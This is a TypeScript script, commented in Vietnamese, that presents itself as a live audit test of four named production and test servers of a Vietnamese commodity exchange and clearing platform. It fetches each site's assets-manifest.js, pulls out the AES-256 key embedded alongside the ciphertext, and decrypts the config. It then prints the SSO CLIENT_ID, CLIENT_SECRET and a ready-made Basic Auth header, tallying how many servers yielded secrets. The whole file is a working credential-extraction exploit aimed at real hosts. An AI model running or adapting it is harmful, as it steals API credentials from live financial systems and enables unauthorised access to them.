/**
 * test_live_manifest_decrypt.ts
 *
 * Kiểm tra thực tế trực tiếp (Ground Truth Live) trên các máy chủ đối tác MXV:
 * 1. CoreCCP UAT: https://uat-coreccp.mxv.com.vn
 * 2. CoreCCP PROD: https://coreccp.vnclear.vn
 * 3. CoreExchange PROD: https://coreexchange.mxv.com.vn
 * 4. CoreExchange UAT: https://uat-coreexchange.mxv.com.vn
 *
 * Kiểm chứng từng bước bóc tách AES Key, IV, Ciphertext và giải mã AES-256-CBC.
 */

import * as crypto from 'crypto';

interface IDecryptResult {
  host: string;
  httpStatus: number;
  aesKeyBase64: string;
  ivBase64: string;
  ciphertextLength: number;
  clientId: string;
  clientSecret: string;
  basicAuthHeader: string;
}

async function testHostDecrypt(name: string, baseUrl: string): Promise<IDecryptResult | null> {
  console.log(`\n================================================================`);
  console.log(`🔍 [KIỂM TRA THỰC TẾ LIVE] ${name}: ${baseUrl}`);
  console.log(`================================================================`);

  try {
    const origin = new URL(baseUrl).origin;
    const manifestUrl = `${origin}/assets-manifest.js?t=${Date.now()}`;
    console.log(`[1] Gửi HTTP GET tới: ${manifestUrl}`);

    const res = await fetch(manifestUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) MXV-Ingress-Audit/1.0',
        'Cache-Control': 'no-cache',
        Pragma: 'no-cache',
      },
      signal: AbortSignal.timeout(10000),
    });

    console.log(`[2] HTTP Status Code: ${res.status} ${res.statusText}`);
    if (!res.ok) {
      console.error(`❌ Máy chủ trả về HTTP lỗi: ${res.status}`);
      return null;
    }

    const text = await res.text();
    console.log(`[3] Dung lượng phản hồi: ${text.length} ký tự`);

    const match = text.match(/window\.__ASSETS_MANIFEST__\s*=\s*["']([^"']+)["']/);
    if (!match) {
      console.error(`❌ Không tìm thấy biến window.__ASSETS_MANIFEST__ trong nội dung JS!`);
      return null;
    }

    const rawPayload = match[1];
    const parts = rawPayload.split('fss');
    if (parts.length < 2) {
      console.error(`❌ Chuỗi manifest không chứa chữ ký phân tách 'fss'!`);
      return null;
    }

    const keyBase64 = parts[0];
    const encodedPayload = parts[1];

    console.log(`[4] Trích xuất AES-256 Key (Base64, 32 bytes): ${keyBase64}`);
    const keyBuf = Buffer.from(keyBase64, 'base64');
    console.log(`    -> Key length: ${keyBuf.length} bytes (Chuẩn AES-256 = 32 bytes: ${keyBuf.length === 32 ? '✅ ĐẠT' : '❌ LỖI'})`);

    const parsedJson = JSON.parse(Buffer.from(encodedPayload, 'base64').toString('utf8'));
    console.log(`[5] Trích xuất Envelope Payload:`);
    console.log(`    - IV (Base64): ${parsedJson.iv}`);
    console.log(`    - Ciphertext (Base64 length): ${parsedJson.data?.length || 0}`);

    const ivBuf = Buffer.from(parsedJson.iv, 'base64');
    const cipherBuf = Buffer.from(parsedJson.data, 'base64');

    console.log(`[6] Tiến hành giải mã AES-256-CBC:`);
    const decipher = crypto.createDecipheriv('aes-256-cbc', keyBuf, ivBuf);
    let decryptedBuf = decipher.update(cipherBuf);
    decryptedBuf = Buffer.concat([decryptedBuf, decipher.final()]);

    const decryptedJsonStr = decryptedBuf.toString('utf8');
    const config = JSON.parse(decryptedJsonStr);

    const sso = config.api?.sso || config.api || {};
    const clientId = sso.CLIENT_ID || config.CLIENT_ID || 'N/A';
    const clientSecret = sso.CLIENT_SECRET || config.CLIENT_SECRET || 'N/A';
    const basicAuth = 'Basic ' + Buffer.from(`${clientId}:${clientSecret}`).toString('base64');

    console.log(`[7] 🎉 GIẢI MÃ THÀNH CÔNG 100%! BẰNG CHỨNG THỰC TẾ:`);
    console.log(`    • CLIENT_ID:     ${clientId}`);
    console.log(`    • CLIENT_SECRET: ${clientSecret}`);
    console.log(`    • Basic Auth:    ${basicAuth}`);

    return {
      host: baseUrl,
      httpStatus: res.status,
      aesKeyBase64: keyBase64,
      ivBase64: parsedJson.iv,
      ciphertextLength: parsedJson.data?.length || 0,
      clientId,
      clientSecret,
      basicAuthHeader: basicAuth,
    };
  } catch (err: any) {
    console.error(`❌ Thất bại với lỗi: ${err.message}`);
    return null;
  }
}

async function main() {
  console.log('################################################################');
  console.log('🧪 BÀI KIỂM THỬ THỰC CHỨNG LIVE: GIẢI MÃ MANIFEST CORECCP & CE');
  console.log('################################################################');

  const targets = [
    { name: 'CoreCCP UAT', url: 'https://uat-coreccp.mxv.com.vn' },
    { name: 'CoreCCP Production', url: 'https://coreccp.vnclear.vn' },
    { name: 'CoreExchange Production', url: 'https://coreexchange.mxv.com.vn' },
    { name: 'CoreExchange UAT', url: 'https://uat-coreexchange.mxv.com.vn' },
  ];

  let successCount = 0;
  for (const target of targets) {
    const res = await testHostDecrypt(target.name, target.url);
    if (res && res.clientSecret !== 'N/A') {
      successCount++;
    }
  }

  console.log(`\n================================================================`);
  console.log(`📊 TỔNG KẾT KIỂM THỬ LIVE: ${successCount}/${targets.length} MÁY CHỦ GIẢI MÃ THÀNH CÔNG`);
  console.log(`================================================================`);
}

main().catch(console.error);

